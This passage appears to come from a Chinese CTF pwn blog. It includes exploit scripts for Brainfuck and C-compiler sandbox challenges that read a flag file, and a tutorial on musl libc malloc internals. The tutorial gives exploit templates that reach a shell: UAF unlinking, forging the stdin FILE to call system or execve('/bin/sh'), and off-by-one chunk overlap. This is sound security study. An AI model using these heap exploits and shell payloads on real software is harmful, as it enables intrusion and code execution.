remote('pwnable.kr',9001)\n#p = process(\"./bf\")\np.recvuntil('welcome to brainfuck testing system!!\\ntype some brainfuck instructions except [ ]\\n')\np.sendline(payload)\n\nlibc_base_addr = u32Leakbase(libc.sym['putchar'])\np.send(p32(libc_base_addr + 0x5fbc6))\np.interactive()\n```\n\n\n\n# 二、2020 RCTF bf\n\n这题不太想调，也是brainFuck语言的，但是在`[]`的实现上有点问题，code在栈上，会存在Off-by-one的情况，刚好溢出到code_addr，可通过修改code_addr来控制程序流从而进行ROP。\n\n\n\n# 三、2020 DAS-CTF OJ0\n\nC编译器，没有附件，过滤了`home`、`ctf`、`flag`等敏感字符和system，exec类的函数\n\n## 解法一：直接读取\n\n通过编写程序读取`/home/ctf/flag`，绕过过滤\n\n```python\nfrom pwn import *\n\ncontext(log_level=\"debug\", arch=\"amd64\")\n\nio = remote(\"183.129.189.60\", 10075)\n\nprogram = \"\"\"\n#include <stdio.h>\n\nint main(){\n\tchar buff[128]={0}, file[128]={0};\n\tscanf(\"%s\", file);\n\tFILE* fp = fopen(file, \"r\");\n\tfscanf(fp, \"%s\", buff);\n\tprintf(\"%s\", buff);\n\treturn 0\n}@\n\n\"\"\"\n\nio.sendlineafter(\"'@')\", program)\nio.sendlineafter(\"(Y/n)\", \"/home/ctf/flag\")\n\nio.interactive()\n```\n\n## 解法二：拼接读取\n\n由于过滤了，所以可以尝试像Web里面的那种拼接读写\n\n```python\nfrom pwn import *\n\ncontext(log_level=\"debug\", arch=\"amd64\")\n\nio = remote(\"183.129.189.60\", 10075)\n\nprogram = \"\"\"\n#include <stdio.h>\n#include<string.h>\n\nint main(){\n    char buf[50]; \n    char path_part_1[5] = \"/hom\"; \n    char path_part_2[5] = \"e/ct\"; \n    char path_part_3[5] = \"f/fl\"; \n    char path_part_4[5] = \"agx00\"; \n    char path[20];\n    sprintf(path, \"%s%s%s%s\", path_part_1, path_part_2, path_part_3, path_part_4);\n    int fd = open(path);\n    read(fd,buf,50);\n    write(1,buf,50);\n}@\n\n\"\"\"\n\nio.sendlineafter(\"'@')\", program)\n\nio.interactive()\n```\n\n\n\n# 四、DEFCON CTF Qualifier 2020 introool \n\n这题不太想调，就是patch，写汇编跳转shellcode等\n\n\n\n# 五、[Redhat2019] Kaleidoscope\n\n这题找不着附件，简单来说就是两个东西`Kaleidoscope`即时解释器和`honggfuzz`\n\n\n\n\n\n# 六、2020 DAS-CTF OJ1\n\n不能输入括号，大中小括号等，例如`int main(){}`等等都不行，可以用如下的形式来进行\n\n```C\nconst char main=0x55,a1=0x48,a2=0x89,a3=0xe5;\n```\n\n编译之后可以看到如下，直接形成汇编代码，那么就可以直接写汇编通i过shellcode或者orw来获取flag了。\n\n![image-20220209133547687](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202091335752.png)\n\n![image-20220209133415993](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202091334057.png)\n","tags":["解释器"],"categories":["PWN","解释器"]},{"title":"Musl从0开始","url":"/2022/01/22/Musl从0开始/","content":"\n\n\n\n\n\n\n# 一、1.2.0及以前版本\n\n## 1.数据结构\n\n### (1)chunk结构\n\n```c\n//v1.2.0 定义在src/internal/malloc_impl.h中\nstruct chunk {\n    size_t psize, csize; // 相当于 glibc 的 prev size 和 size\n    struct chunk *next, *prev;\n};\n```\n\n①不重用psize字段\n\n②psize和size都有inuse标志位，分别代表前一个chunk和当前chunk的使用状态。\n\n### (2)堆管理结构mal\n\n类似于arena，记录堆中的相关状态，bins结构体等\n\n```c\n//v1.2.0  定义在src/malloc/malloc.c中\nstatic struct {\n\tvolatile uint64_t binmap; //64位无符号整数binmap\n\tstruct bin bins[64];\n\tvolatile int free_lock[2];\n} mal;\n```\n\n### (3)bitmap:\n\n`binmap`记录每个 bin 是否为非空，若对应某个比特位为 1，则表示对应的 bin 为非空，存在chunk\n\n在unbin函数操作过程中，如果操作的chunk(C)的prev和next指针相等，就会将对应的bin的bitmap设置为0，使其处于置空的状态。\n\n### (4)bins\n\n```c\n//v1.2.0 定义在src/internal/malloc_impl.h中\nstruct bin {\n    volatile int lock[2];\n    struct chunk *head;\n    struct chunk *tail;\n};\n```\n\n构成类似unsortedbin的双向循环链表，当链表为空时，`head`和`tail`指针等于 0 或者指向链表头部自身。\n\n每个bin存储的chunk范围如下\n\n| bin 下标 i | chunk 大小个数 |  chunk 大小范围   |           下标 i 与 chunk 大小范围的关系            |\n| :--------- | :------------- | :---------------: | :-------------------------------------------------: |\n| 0-31       | 1              |   0x20 – 0x400    |                    (i+1) * 0x20                     |\n| 32-35      | 8              |   0x420 – 0x800   |    (0x420+(i-32) *0x100) ~ (0x500+(i-32)* 0x100)    |\n| 36-39      | 16             |  0x820 – 0x1000   |   (0x820+(i-36) *0x200) ~ (0x1000+(i-36)* 0x200)    |\n| 40-43      | 32             |  0x1020 – 0x2000  |   (0x1020+(i-40) *0x400) ~ (0x1400+(i-40)* 0x400)   |\n| 44-47      | 64             |  0x2020 – 0x4000  |   (0x2020+(i-44) *0x800) ~ (0x2800+(i-44)* 0x800)   |\n| 48-51      | 128            |  0x4020 – 0x8000  |  (0x4020+(i-48) *0x1000) ~ (0x5000+(i-48)* 0x1000)  |\n| 52-55      | 256            | 0x8020 – 0x10000  |  (0x8020+(i-52) *0x2000) ~ (0xa000+(i-52)* 0x2000)  |\n| 56-59      | 512            | 0x10020 – 0x20000 | (0x10020+(i-56) *0x4000) ~ (0x14000+(i-56)* 0x4000) |\n| 60-62      | 1024           | 0x20020 – 0x38000 | (0x20020+(i-60) *0x8000) ~ (0x28000+(i-60)* 0x8000) |\n| 63         | 无限           |   0x38000 以上    |                      0x38000 ~                      |\n\n前 32 个 bin 类似 fastbin和smallbin，每个 bin 只对应一种大小的 chunk，但是也是双向循环链表，第一个释放到bins中的chunk都会使得next和prev指针带上libc地址。\n\n后面的则类似largebin，对应多种范围大小的chunk。\n\n\n\n## 2.维护方式\n\n在 64 位系统下 chunk 大小是以 32 字节对齐的，这与 glibc 16 字节对齐不同，故 chunk 大小最小为 0x20 字节，然后按 0x40、0x60、0x80… 逐渐递增，不共用psize位，所以每次都会将申请的size+0x10。\n\n```\nmalloc(0x10)->0x20\nmalloc(0x11)->0x40\nmalloc(0x2f)->0x40\nmalloc(0x30)->0x40\nmalloc(0x31)->0x60\n```\n\n维护链表的方式是 FILO（从链表首部取出 chunk，从尾部插入 chunk），并且都是双向循环链表\n\n没有实现如`__malloc_hook`、`__free_hook`之类的 hook 函数\n\n\n\n## 3.关键函数\n\n### (1)mallco\n\n```c\n//v1.2.0  src/malloc/malloc.c中\nvoid *malloc(size_t n)\n{\n\tstruct chunk *c;\n\tint i, j;\n\n    //调整n大小，对齐0x20\n\tif (adjust_size(&n) < 0) return 0;\n\n    //如果n大于MMAP_THRESHOLD (0x38000)，使用 mmap\n\tif (n > MMAP_THRESHOLD) {\n\t\tsize_t len = n + OVERHEAD + PAGE_SIZE - 1 & -PAGE_SIZE;\n\t\tchar *base = __mmap(0, len, PROT_READ|PROT_WRITE,\n\t\t\tMAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\n\t\tif (base == (void *)-1) return 0;\n\t\tc = (void *)(base + SIZE_ALIGN - OVERHEAD);\n\t\tc->csize = len - (SIZE_ALIGN - OVERHEAD);\n\t\tc->psize = SIZE_ALIGN - OVERHEAD;\n\t\treturn CHUNK_TO_MEM(c);\n\t}\n\n    //计算对应的binmap下标i\n\ti = bin_index_up(n);\n\tfor (;;) {\n        //查找binmap\n\t\tuint64_t mask = mal.binmap & -(1ULL<<i);\n        \n        //如果bin均为空，那么调用expand_heap函数延展堆空间，生成新的chunk返回\n\t\tif (!mask) {\n\t\t\tc = expand_heap(n);\n\t\t\tif (!c) return 0;\n\t\t\tif (alloc_rev(c)) {\n\t\t\t\tstruct chunk *x = c;\n\t\t\t\tc = PREV_CHUNK(c);\n\t\t\t\tNEXT_CHUNK(x)->psize = c->csize =\n\t\t\t\t\tx->csize + CHUNK_SIZE(c);\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n        \n        //获取大小最接近n(size)的可用bin下标j\n\t\tj = first_set(mask);\n\t\tlock_bin(j);\n\t\tc = mal.bins[j].head;\n        //BIN_TO_CHUNK不知道什么函数\n\t\tif (c != BIN_TO_CHUNK(j)) {、\n            //使用 pretrim判断c的大小和需求的size(n)，相差太大就切割\n            //否则使用 unlock从链表中取出\n\t\t\tif (!pretrim(c, n, i, j)) unbin(c, j);\n\t\t\tunlock_bin(j);\n\t\t\tbreak;\n\t\t}\n\t\tunlock_bin(j);\n\t}\n\n\t/* Now patch up in case we over-allocated */\n    //切割之后回收 c 中大小超过 n 的部分\n\ttrim(c, n);\n\n\treturn CHUNK_TO_MEM(c);\n}\n```\n\n#### 详细步骤：\n\n+ 调整 n，对齐0x20\n\n+  如果 n > MMAP_THRESHOLD (0x38000)，使用 mmap 创建一块大小为 n 的内存，返回给用户。\n\n+ 如果 n <= MMAP_THRESHOLD (0x38000)，计算 n 对应的 bin 下标 i，查找 binmap\n\n  + 如果所有的可用 bin 均为空，调用expand_heap函数延展堆空间，生成一个新的 chunk返回\n\n  + 如果存在非空的可用 bin，选择大小最接近 n 的 bins[j]，得到 bin 链表首部的 chunk c\n    如果符合 pretrim 条件，使用 pretrim 分割 c，否则使用 unbin 从链表中取出 c，最后将分割剩下的chunk进入trim函数回收，将c返回给用户。\n\n至于那个unlock_bin好像是同步用的，应该是多线程防止竞争读写吧，不太懂\n\n```c\n//v1.2.0  src/malloc/malloc.c中\n/* Synchronization tools */\n\nstatic inline void lock(volatile int *lk)\n{\n\tif (libc.threads_minus_1)\n\t\twhile(a_swap(lk, 1)) __wait(lk, lk+1, 1, 1);\n}\n\nstatic inline void unlock(volatile int *lk)\n{\n\tif (lk[0]) {\n\t\ta_store(lk, 0);\n\t\tif (lk[1]) __wake(lk, 1, 1);\n\t}\n}\n\nstatic inline void lock_bin(int i)\n{\n\tlock(mal.bins[i].lock);\n\tif (!mal.bins[i].head)\n\t\tmal.bins[i].head = mal.bins[i].tail = BIN_TO_CHUNK(i);\n}\n\nstatic inline void unlock_bin(int i)\n{\n\tunlock(mal.bins[i].lock);\n}\n```\n\n\n\n#### ①unbin\n\n类似于unlink的解链操作，无任何检测\n\n```c\n//v1.2.0  src/malloc/malloc.c中\nstatic void unbin(struct chunk *c, int i)\n{\n\tif (c->prev == c->next)\n\t\ta_and_64(&mal.binmap, ~(1ULL<<i));\n    //解链\n\tc->prev->next = c->next;\n\tc->next->prev = c->prev;\n    //设置 INUSE 标志位，双重标志位都会设置\n\tc->csize |= C_INUSE;\n\tNEXT_CHUNK(c)->psize |= C_INUSE;\n}\n```\n\n#### ②pretrim\n\n切割chunk，需要满足一定条件才会进行切割操作\n\n```c\n//v1.2.0  src/malloc/malloc.c中\n/* pretrim - trims a chunk _prior_ to removing it from its bin.\n * Must be called with i as the ideal bin for size n, j the bin\n * for the _free_ chunk self, and bin j locked. */\nstatic int pretrim(struct chunk *self, size_t n, int i, int j)\n{\n\tsize_t n1;\n\tstruct chunk *next, *split;\n\n\t/* We cannot pretrim if it would require re-binning. */\n\tif (j < 40) return 0;// 条件 1:j(大小最接近size的可用bin下标)大于 40\n    \n    // 条件 2: j(大小最接近size的可用bin下标)与i(计算出来的bin下标)相隔 3 个 bin 或以上，\n    // 或者j(大小最接近size的可用bin下标)等于63且size相差大于 MMAP_THRESHOLD(0x38000)\n\tif (j < i+3) {\n\t\tif (j != 63) return 0;\n\t\tn1 = CHUNK_SIZE(self);\n\t\tif (n1-n <= MMAP_THRESHOLD) return 0;\n\t} else {\n\t\tn1 = CHUNK_SIZE(self);\n\t}\n    \n    //条件3: size相差的数值属于bins[j]的范围内，即split与self属于同一个bin\n\tif (bin_index(n1-n) != j) return 0;\n\n    //切割出一块大小为n的chunk用来返回\n\tnext = NEXT_CHUNK(self);\n\tsplit = (void *)((char *)self + n);\n\n\tsplit->prev = self->prev;\n\tsplit->next = self->next;\n\tsplit->prev->next = split;\n\tsplit->next->prev = split;\n\tsplit->psize = n | C_INUSE;\n\tsplit->csize = n1-n;\n\tnext->psize = n1-n;\n\tself->csize = n | C_INUSE;\n\treturn 1;\n}\n```\n\n取个名字好听点：\n\n`J：search_bin_idx`\n\n`I：calc_bin_idx`\n\n`n：need_size`\n\n总的条件如下：\n\n+ `search_bin_idx`大于 40\n\n+ `search_bin_idx`与`calc_bin_idx`相隔 3 个 bin 或以上，或者`search_bin_idx`等于63且`bins[search_bin_idx].head->size - need_size > MMAP_THRESHOLD(0x38000)`\n\n+ `bins[search_bin_idx].head->size - need_size`的值在`bins[search_bin_idx]`中\n\n即在将Chunk拿出bin之前，先进行切割赋值，设置对应的指针，然后才解链，chunk还是从bin中找到的chunk，之后在unbin中进行inuse位的修改。\n\n\n\n#### ③trim\n\n```C\n//v1.2.0  src/malloc/malloc.c中\nstatic void trim(struct chunk *self, size_t n)\n{\n\tsize_t n1 = CHUNK_SIZE(self);\n\tstruct chunk *next, *split;\n\n    //类似于unsortebin中如果多出来的size小于0x10，那就直接返回给用户一样\n    //DONTCARE(0x10)，也就是确保回收的chunk的size至少为0x10，chunk至少0x20对齐\n\tif (n >= n1 - DONTCARE) return;\n\n\tnext = NEXT_CHUNK(self);\n\tsplit = (void *)((char *)self + n);\n\n\tsplit->psize = n | C_INUSE;\n\tsplit->csize = n1-n | C_INUSE;\n\tnext->psize = n1-n | C_INUSE;\n\tself->csize = n | C_INUSE;\n\n    // 将多余的chunk释放到 bin\n\t__bin_chunk(split);\n}\n```\n\n\n\n### (2)free\n\n这个比较简单，如果csize没有设置标志位，就有两种可能，要么是double free，要么是mmap出来的chunk。所以进入unmap_chunk函数仔细判断，否则就是设置了标志位，正常进入__bin_chunk函数进行释放。\n\n```C\n////v1.2.0  src/malloc/malloc.c中\nvoid free(void *p)\n{\n\tif (!p) return;\n\n\tstruct chunk *self = MEM_TO_CHUNK(p);\n\t//判断csize是否设置了标志位\n\tif (IS_MMAPPED(self))\n\t\tunmap_chunk(self);//检测psize字段\n\telse\n\t\t__bin_chunk(self);//正常释放\n}\n```\n\n#### ①unmap_chunk\n\n```c\n////v1.2.0  src/malloc/malloc.c中\nstatic void unmap_chunk(struct chunk *self)\n{\n\tsize_t extra = self->psize;\n\tchar *base = (char *)self - extra;\n\tsize_t len = CHUNK_SIZE(self) + extra;\n\t/* Crash on double free */\n    //如果psize字段设置inuse位，直接crash\n\tif (extra & 1) a_crash();\n    //否则作为mmap chunk进入释放函数\n\t__munmap(base, len);\n}\n```\n\n#### ②__bin_chunk\n\n正常的释放函数，首先合并 chunk 前后的空闲 chunk、设置 binmap 和 chunk 标志位，最后将 chunk 插入到对应的 bin 链表中。\n\n```c\n////v1.2.0  src/malloc/malloc.c中\nvoid __bin_chunk(struct chunk *self)\n{\n\tstruct chunk *next = NEXT_CHUNK(self);\n\tsize_t final_size, new_size, size;\n\tint reclaim=0;\n\tint i;\n\n\n\tfinal_size = new_size = CHUNK_SIZE(self);\n\n\t/* Crash on corrupted footer (likely from buffer overflow) */\n   \t//若下一个 chunk 的 psize 不等于 self 的 csize，则 crash\n    //相当于检测pre_size和size\n\tif (next->psize != self->csize) a_crash();\n\n    \n    //检测该chunk的前后是否处于空闲状态\n\tfor (;;) {\n        //对于上一个chunk，检测当前chunk的psize位\n        //对于下一个chunk，检测下一个chunk的csize位\n\t\tif (self->psize & next->csize & C_INUSE) {\n            //前后处于use状态，那么对当前chunk进行释放即可\n            //清除当前chunk的inuse位，下一个chunk的psize位\n\t\t\tself->csize = final_size | C_INUSE;\n\t\t\tnext->psize = final_size | C_INUSE;\n\t\t\ti = bin_index(final_size);\n\t\t\tlock_bin(i);\n\t\t\tlock(mal.free_lock);\n            //退出循环检测\n\t\t\tif (self->psize & next->csize & C_INUSE)\n\t\t\t\tbreak;\n\t\t\tunlock(mal.free_lock);\n\t\t\tunlock_bin(i);\n\t\t}\n\n        //向上合并空闲的chunk\n\t\tif (alloc_rev(self)) {\n\t\t\tself = PREV_CHUNK(self);\n\t\t\tsize = CHUNK_SIZE(self);\n\t\t\tfinal_size += size;\n\t\t\tif (new_size+size > RECLAIM && (new_size+size^size) > size)\n\t\t\t\treclaim = 1;\n\t\t}\n\n        //向下合并空闲的chunk\n\t\tif (alloc_fwd(next)) {\n\t\t\tsize = CHUNK_SIZE(next);\n\t\t\tfinal_size += size;\n\t\t\tif (new_size+size > RECLAIM && (new_size+size^size) > size)\n\t\t\t\treclaim = 1;\n\t\t\tnext = NEXT_CHUNK(next);\n\t\t}\n\t}\n\n    //设置对应binmap的标志位，bins[i]\n\tif (!(mal.binmap & 1ULL<<i))\n\t\ta_or_64(&mal.binmap, 1ULL<<i);\n\n\tself->csize = final_size;\n\tnext->psize = final_size;\n\tunlock(mal.free_lock);\n\n    //将当前chunk放到bins[i]的尾部，FILO的形式\n\tself->next = BIN_TO_CHUNK(i);\n\tself->prev = mal.bins[i].tail;\n\tself->next->prev = self;\n\tself->prev->next = self;\n\n\t/* Replace middle of large chunks with fresh zero pages */\n\tif (reclaim) {\n\t\tuintptr_t a = (uintptr_t)self + SIZE_ALIGN+PAGE_SIZE-1 & -PAGE_SIZE;\n\t\tuintptr_t b = (uintptr_t)next - SIZE_ALIGN & -PAGE_SIZE;\n#if 1\n\t\t__madvise((void *)a, b-a, MADV_DONTNEED);\n#else\n\t\t__mmap((void *)a, b-a, PROT_READ|PROT_WRITE,\n\t\t\tMAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);\n#endif\n\t}\n\n\tunlock_bin(i);\n}\n```\n\n## 4.静态堆内存\n\n在Libc初始化时，如下\n\n```C\nvoid __dls3(size_t *sp)\n{\n    [...]\n    // ldso/dynlink.c L1839-L1840\n    /* Donate unused parts of app and library mapping to malloc */\n    reclaim_gaps(&app);\n    reclaim_gaps(&ldso);\n    [...]\n}\n```\n\n会调用`reclaim_gaps`函数查找程序和 libc 库的空闲内存，通常是位于Data段上，该函数中会调用`__malloc_donate`函数将空闲内存释放到 bin中。\n\n```C\n// ldso/dynlink.c L526-L552\n/* A huge hack: to make up for the wastefulness of shared libraries\n * needing at least a page of dirty memory even if they have no global\n * data, we reclaim the gaps at the beginning and end of writable maps\n * and \"donate\" them to the heap. */\n\nstatic void reclaim(struct dso *dso, size_t start, size_t end)\n{\n    // 避开 RELRO 段\n    if (start >= dso->relro_start && start < dso->relro_end) start = dso->relro_end;\n    if (end   >= dso->relro_start && end   < dso->relro_end) end = dso->relro_start;\n    if (start >= end) return;\n    char *base = laddr_pg(dso, start);\n    // 使用 __malloc_donate 函数将内存释放到 bin 中\n    __malloc_donate(base, base+(end-start));\n}\n\nstatic void reclaim_gaps(struct dso *dso)\n{\n    Phdr *ph = dso->phdr;\n    size_t phcnt = dso->phnum;\n\n    // 遍历每一个段\n    for (; phcnt--; ph=(void *)((char *)ph+dso->phentsize)) {\n        // 条件 1：段不属于可加载段（PT_LOAD）\n        if (ph->p_type!=PT_LOAD) continue;\n        // 条件 2：段可读可写\n        if ((ph->p_flags&(PF_R|PF_W))!=(PF_R|PF_W)) continue;\n        // 在段所属的内存页中，将段前后的空闲内存传递给 reclaim 函数\n        reclaim(dso, ph->p_vaddr & -PAGE_SIZE, ph->p_vaddr);\n        reclaim(dso, ph->p_vaddr+ph->p_memsz,\n            ph->p_vaddr+ph->p_memsz+PAGE_SIZE-1 & -PAGE_SIZE);\n    }\n}\n```\n\n初始化结束后，在bins中会多出几个chunk\n\n![image-20220217112724849](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171127046.png)\n\n不一定是三个chunk，多少个都有可能，主要看程序或者libc中是否存在空闲的内存。之后再进行堆内存分配时，就会在这个基础上进行分配，而非在所有bins都是空的状态进行分配。\n\n\n\n## 5.利用方式\n\n### (1)泄露地址\n\n#### ①基于静态堆内存\n\n那么基于静态堆内存的存在，由于最开始进行分配是在存在静态堆内存的情况下分配的，所以如果申请的chunk的size依据申请规则可以对静态堆内存进行切割，那么就会进行切割，由于是切割的chunk，那么此时返回的chunk的就会自然而然带上地址。\n\n同样的，当碰上静态堆内存初始化之后，在一个bins中同时存在程序中的chunk和libc中的chunk时，我们将该chunk切割或者申请出来，就可以同时泄露Libc地址和程序ELF地址了。\n\n#### ②基于bins\n\n前面提到，释放到bins中head指针下chunk必然会带上libc地址，那么直接申请回来就可以进行Libc地址的泄露\n\n\n\n### (2)getshell\n\n#### ①UAF\n\n##### 方法一：\n\n这种情况可以直接通过改掉位于bin中head头部chunk的next和prev指针，然后从该bin中申请chunk，通过unbin函数中的如下操作即可进行任意地址任意写，其中的c也就是bin中的head指向的chunk。\n\n```C\nc->prev->next = c->next;\nc->next->prev = c->prev;\n```\n\n相关的exp模板如下\n\n```python\nbins_a0h_addr = libc_base + 0x292b28\nstdin_addr = libc_base + 0x292200\nadd_malloc(0x1000)\nfree(0)\nedit(0,0x10,p64(bins_a0h_addr-0x10)+p64(stdin_addr-0x10))\nadd_malloc(0x1000)\nedit(0,0x10,p64(stdin_addr-0x10)+p64(bins_a0h_addr-0x10))\nadd_malloc(0x1000)\n```\n\n可以连续用两次也没啥问题，由于我们劫持了这个改写指针的操作，所以在相对于的bin结构中的head和tail指针并没有改变，所以仍然可以使用。\n\n用两次的原因是需要在`stdin->prev`和`stdin->next`都写下一个可写地址，这样之后再从对应bin的head中申请出来时，经过unbin函数中的指针赋值操作不会出错，否则就会出现不可写或者零地址取值操作导致失败。\n\n以上操作结束后就可以看到在bins[4]，也是0xa0大小对应的bin中的head指针已经被我们修改为stdin_addr-0x10，同时对应的stdin结构体的prev和next指针也是可写地址\n\n![image-20220217185755489](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171857586.png)\n\n之后从中bins[4]中申请chunk即可申请出stdin结构体，之后对应修改所需数据即可\n\n```\nf->wpos != f->wbase\nf->flag = \"/bin/shx00\"\nf->write = system\nf->lock=0\n```\n\n相应exp模板如下\n\n```\nadd_malloc(0xa0-0x20)\nedit(3,0x50+0x50,\"/bin/sh\\x00\"+p64(0)*4+p64(0x1)+p64(0x0)+p64(0x2)+p64(0x0)+p64(system_addr) + \\\n\tp64(0x0)*8)\n```\n\n最后调用exit()函数即可，调用链为`exit()->__stdio_exit_needed()(//或者是__stdio_exit)->close_file(__stdin_used)->f->write(f, 0, 0);`这里的f即是传入的stdin\n\n```\n// src/stdio/__stdio_exit.c\nstatic void close_file(FILE *f)\n{\n\tif (!f) return;\n\tFFINALLOCK(f);\n\tif (f->wpos != f->wbase) f->write(f, 0, 0);\n\tif (f->rpos != f->rend) f->seek(f, f->rpos-f->rend, SEEK_CUR);\n}\n\nvoid __stdio_exit(void)\n{\n\tFILE *f;\n\tfor (f=*__ofl_lock(); f; f=f->next) close_file(f);\n\tclose_file(__stdin_used);\n\tclose_file(__stdout_used);\n\tclose_file(__stderr_used);\n}\n```\n\n不过由于`FFINALLOCK(f);`的存在，如果进入这个函数不知道为什么会崩溃，也可能是某些设置上的问题吗？所以为了不进入这个函数，那么需要将`f->lock`置零即可\n\n![image-20220217183236401](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171832664.png)\n\n最后即可调用f->write，即劫持的system函数，rdi为stdin结构体，来getshell\n\n最终小模板如下\n\n```python\nbins_a0h_addr = libc_base + 0x292b28\nstdin_addr = libc_base + 0x292200\nadd_malloc(0x1000)\nadd_malloc(0xa0-0x20)\nadd_malloc(0xa0-0x20)\nfree(1)\nfree(0)\ndbg()\nedit(0,0x10,p64(bins_a0h_addr-0x10)+p64(stdin_addr-0x10))\nadd_malloc(0x1000)\nedit(0,0x10,p64(stdin_addr-0x10)+p64(bins_a0h_addr-0x10))\nadd_malloc(0x1000)\n#dbg()\nadd_malloc(0xa0-0x20)\n#pause()\nedit(5,0x50+0x50,\"/bin/sh\\x00\"+p64(0)*4+p64(0x1)+p64(0x0)+p64(0x2)+p64(0x0)+p64(system_addr) + \\\n\tp64(0x0)*8)\n#dbg()\nexit()\np.interactive()\n```\n\n##### 方法二：\n\n这个相对方法一就简单很多，只需要一个任意地址写即可，思路也是类似的。\n\n观察上面的`__stdio_exit`函数，我们可以发现，其实它最后使用的是`__stdin_used`，而这个数据保存着stdin结构体指针，并且该数据位于libc上可读可写处，也就是说，我们可以尝试劫持`__stdin_used`下的stdin结构体指针到堆上，在堆上伪造我们的数据，从而在调用exit函数时从堆上取数据执行最终的命令。\n\n```python\nexecve_addr = libc_base + libc.sym['execve']\nstdin_usedpoint_addr = libc_base + 0x292430\nheap_addr = 0x555555759000\nadd_malloc(0x1000)\nfree(0)\nedit(0,0x10,p64(stdin_usedpoint_addr-0x10-0x8)+p64(heap_addr+0x50))\nadd_malloc(0x1000)\nedit(0,0x30+0x50+0x50,'\\x00'*0x30+\"/bin/sh\\x00\"+p64(0)*4+p64(0x1)+p64(0x0)+p64(0x2)+p64(0x0)+p64(execve_addr) + \\\n\tp64(0x0)*8)\nexit()\np.interactive()\n```\n\n可以看到，在最后的执行命令处，rdi被成功更改为堆上的地址，并且也是对应寻找偏移找到了`execve`函数地址，更加简便了\n\n![image-20220217193622906](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171936093.png)\n\n同时由于最后调用的`f->write(f,0,0)`，其中rsi和rdx必定为0，所以推荐还是使用execve函数，防止system函数出现非预期的一些栈环境或者其他变化，导致无法getshell。\n\n##### 方法三：\n\n同样的，如果是ORW，再进一步的话，是不是musl中也存在类似于setcontext之类可以甚至栈的gadget呢，其实是有的，在`longjmp`函数中，\n\n```\n//1.1.24的libc中\n.text:0000000000048B96                 mov     rdx, [rdi+30h]\n.text:0000000000048B9A                 mov     rsp, rdx\n.text:0000000000048B9D                 mov     rdx, [rdi+38h]\n.text:0000000000048BA1                 jmp     rdx\n```\n\n相对应在1.2.0以上版本中也是有类似的，也在`longjmp`函数中，那么我们就可以将`__stdin_used`劫持为堆地址，在堆上布置下我们的ORW来进行攻击\n\n\n\n#### ②off-by-one\n\n一般在Musl环境下的堆题，基本不存在off-by-null的情况的，因为当前chunk的csize会和下一个chunk的psize进行比对，如果不等会crash。\n\n```c\n//__bin_chunk函数中\n//若下一个 chunk 的 psize 不等于 self 的 csize，则 crash\n    //相当于检测pre_size和size\n\tif (next->psize != self->csize) a_crash();\n```\n\n而由于不重用psize字段，就算溢出一个零字节，也无法覆盖到csize字段，只能覆盖到pszie字段，所以当可以溢出一个任意字节时，我们就可以修改psize字段，向上进行堆块重叠合并。\n\n```python\nadd_malloc(0x40-0x10)\nadd_malloc(0x40-0x10)\nadd_malloc(0x40-0x10)\nadd_malloc(0x40-0x10)\nedit(1,(0x40-0x10+0x1),'\\x00'*(0x40-0x10)+p8(0x80))\nfree(0)\nfree(2)\n```\n\n这样chunk0和chunk1就会合并到一块进入bin中，制造chunk1的堆块重叠，但是由于函数机制问题，chunk2实际上是并没有被释放到bin中的。\n\n##### 未合并前如下：\n\n![image-20220218113100251](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181131379.png)\n\n##### 合并后如下：\n\n![image-20220218113620389](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181136514.png)\n\n那么之后将chunk1释放，在将chunk0+chunk1申请回来，即可制造一个UAF了。\n\n```python\nedit(1,(0x40-0x10+0x1),'\\x00'*(0x40-0x10)+p8(0x41))\nfree(1)\nadd_malloc(0x80-0x10)\n```\n\n如下所示\n\n![image-20220218120440262](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181204446.png)\n\n有了UAF之后就好办很多了，还是参考上述的UAF情况\n\n\n\n# 二、1.2.1及之后版本\n\n这个版本下的堆管理方式有了很大的变化，可以说和原来的都不是一个东西了。\n\n参考\n\n[新版musl-libc malloc源码分析与调试 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/252293)\n\n[从musl libc 1.1.24到1.2.2 学习pwn姿势 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/253566#h3-2)\n\n[musl-1.2.x堆部分源码分析 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/246929)\n\n## 1.数据结构\n\n### (1)chunk结构\n\n在该版本之后，并没有像之前一样将chunk结构定义在代码里，所以我们只能自己来进行猜测，大致如下\n\n```C\nstruct chunk {\n    uint8_t res;        // 保留,一直为\\x00\n    uint8_t idx:5;      \n    //低5bit作为idx表示这是group中第几个chunk, 高3bit作为reserved\n    //如果该chunk被free，则该字节被置为0xff,同时下面的offset被置为0\n    uint8_t reserved:3;  // 不知道干啥的\n    uint16_t offset;     //与第一个chunk的偏移\n    \t\t\t\t\t//如果为4则chunk_addr-0x40=first_chunk_addr\n    /*如果是group中的第一个chunk，那么还有如下数据\n    struct meta* meta;//指向管理该group的meta\n\tunsigned char active_idx:5;//占据5bytes,表示该group中共有几个slot,也就是chunk\n\tchar pad[UNIT - sizeof(struct meta *) - 1];\n    */\n    char user_data[];    // 最后一字节需要为\\x00\n    char remain_data[];  // 剩余空间最后一字节需要为\\x00\n    uint32_t remain_size; // chunk剩余size大小\n};\n```\n\n如下图所示，chunk分布大概如下\n\n![image-20220318114135427](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203181141533.png)\n\n其中chunk1的idx即为该group中的第1个Chunk，为0x1\n\n而这整片开辟的空间，包括未被分配的chunk，如下面的马赛克部分且一直向下延申到一定位置，连在一起叫做`group`\n\n### (2)group\n\n也就是通过mmap开辟出来用来存放chunk的一片空间，定义如下\n\n```c\n//1.2.1-src/malloc/mallocng/meta.h\nstruct group {\n\tstruct meta *meta;//即上图头部chunk0中的第一个指针地址\n\tunsigned char active_idx:5;//占据5bytes\n\tchar pad[UNIT - sizeof(struct meta *) - 1];\n\tunsigned char storage[];\n    